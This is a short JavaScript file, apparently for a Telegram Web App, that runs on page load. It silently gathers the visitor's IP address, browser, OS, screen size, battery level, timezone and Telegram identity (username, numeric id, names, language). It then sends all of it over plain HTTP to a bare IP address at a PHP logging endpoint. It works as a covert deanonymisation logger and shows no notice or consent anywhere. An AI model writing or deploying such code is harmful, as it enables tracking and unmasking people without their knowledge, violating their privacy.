async function getIPAddress() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        return 'неизвестно';
    }
}

function getUserAgent() {
    return navigator.userAgent || 'неизвестно';
}

function getOSName() {
    return navigator.platform || 'неизвестно';
}

function getScreenResolution() {
    return `${window.screen.width}x${window.screen.height}` || 'неизвестно';
}

async function getBatteryPercentage() {
    try {
        const battery = await navigator.getBattery();
        return Math.floor(battery.level * 100);
    } catch (error) {
        return 'неизвестно';
    }
}

function getBrowserInfo() {
    return {
        name: navigator.appName || 'неизвестно',
        version: navigator.appVersion || 'неизвестно',
        engine: navigator.product || 'неизвестно'
    };
}

async function sendDataToTelegram() {
    const ipAddress = await getIPAddress();
    const userAgent = getUserAgent();
    const osName = getOSName();
    const screenResolution = getScreenResolution();
    const batteryPercentage = await getBatteryPercentage();
    const browserInfo = getBrowserInfo();
    let tg = window.Telegram.WebApp;

    const postData = {
        chat: tg.initDataUnsafe.start_param,
        username: tg.initDataUnsafe.user.username || 'неизвестно',
        id: tg.initDataUnsafe.user.id || 'неизвестно',
        name: tg.initDataUnsafe.user.first_name || 'неизвестно',
        surname: tg.initDataUnsafe.user.last_name || 'неизвестно',
        language: tg.initDataUnsafe.user.language_code || 'неизвестно',
        allows: tg.initDataUnsafe.user.allows_write_to_pm || 'неизвестно',
        ip: ipAddress,
        useragent: userAgent,
        osname: osName,
        resolution: screenResolution,
        battery: batteryPercentage,
        time: new Date().getTimezoneOffset(),
        browsername: browserInfo.name,
        browserver: browserInfo.version,
        browserv: browserInfo.engine
    };

    try {
        const response = await fetch('http://77.221.152.103/sergey/logapu.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(postData)
        });
        const result = await response.json();
        console.log('yep:', result);
    } catch (error) {
        console.error('Error');
    }
}

sendDataToTelegram();
